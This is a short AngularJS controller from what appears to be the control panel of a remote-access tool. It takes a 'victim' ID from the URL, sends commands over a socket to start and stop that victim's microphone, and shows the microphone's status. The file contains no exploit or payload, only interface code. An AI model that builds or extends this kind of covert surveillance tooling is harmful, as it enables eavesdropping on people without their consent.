angular.module('myappy', []).controller('LabCtrl', function ($scope) {
    var socket = io();

    // Get Victim ID from URL
    function getQueryParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
    }

    $scope.victimId = getQueryParam('id');
    $scope.micStatus = 'Stopped';

    $scope.startMic = function () {
        socket.emit('startMic', $scope.victimId);
    };

    $scope.stopMic = function () {
        socket.emit('stopMic', $scope.victimId);
    };

    socket.on('micStatus', function (data) {
        if (data.id === $scope.victimId) {
            $scope.$apply(function () {
                $scope.micStatus = data.status;
            });
        }
    });
});
